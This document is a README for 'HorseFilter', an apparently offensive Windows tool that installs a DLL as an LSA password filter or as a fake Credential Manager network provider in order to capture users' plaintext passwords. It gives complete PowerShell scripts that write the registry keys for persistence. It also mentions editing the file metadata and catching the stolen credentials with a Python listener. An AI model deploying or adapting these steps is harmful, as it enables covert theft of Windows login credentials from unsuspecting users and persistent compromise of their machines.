# HorseFilter
- i basically wanted to learn how [winfilter](https://github.com/kindtime/winfilter) works so i made this
- i recommend compiling on linux with mingw-w64
- update macros in `shared/macros.h`
- update file metadata in `shared/horsefilter.rc`
- catch creds with `horsefilter.py`



## LSA Notification Package
- also called a [password filter](https://learn.microsoft.com/en-us/windows/win32/secmgmt/password-filters), handles password change events
- used to set custom password requirements
- horsefilter approves any password (then steals it)
1. place DLL anywhere in PATH
2. append DLL name (no extension) to registry key
3. reboot
```ps1
$DLLName = "horsefilter"

$Path = "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\"
$Value = "Notification Packages"

$Current = Get-ItemProperty -Path $Path -Name $Value
$New = $Current."$Value" + $DLLName

Set-ItemProperty -Path $Path -Name $Value -Value $New
```

## Credential Manager Network Provider
- [credential manager network providers](https://learn.microsoft.com/en-us/windows/win32/secauthn/credential-manager) are soon to be deprecated
- they get notified of logon events to connect users to different networks with sso
- horsefilter steals the password then connects them to nothing
1. place DLL in a known path (e.g. system32)
2. add it to the network provider order key
3. create a network provider service key
<!-- 4. reboot -->

```ps1
$DLLName = "horsefilter"
$DLLPath = "%SystemRoot%\System32\" + $DLLName + ".dll"

$OrderPath = "HKLM:\SYSTEM\CurrentControlSet\Control\NetworkProvider\Order"
$OrderValue = "ProviderOrder"

$CurrentOrder = Get-ItemProperty -Path $OrderPath -Name $OrderValue
$NewOrder = $CurrentOrder."$OrderValue" + "," + $DLLName

Set-ItemProperty -Path $OrderPath -Name $OrderValue -Value $NewOrder

$ServicePath = "HKLM:\SYSTEM\CurrentControlSet\Services\" + $DLLName
New-Item -Path $ServicePath
# New-ItemProperty -Path $ServicePath -Name "Group" -Value "NetworkProvider"

$ServicePath += "\NetworkProvider"
New-Item -Path $ServicePath
 
New-ItemProperty -Path $ServicePath -Name "Class" -Value 0x00000002 # WN_CREDENTIAL_CLASS
New-ItemProperty -Path $ServicePath -Name "Name" -Value $DLLName
New-ItemProperty -Path $ServicePath -Name "ProviderPath" -PropertyType ExpandString -Value $DLLPath
```
---
the lsa internal unicode string struct is only [sometimes](https://learn.microsoft.com/en-us/windows/win32/api/lsalookup/ns-lsalookup-lsa_unicode_string#members) null terminated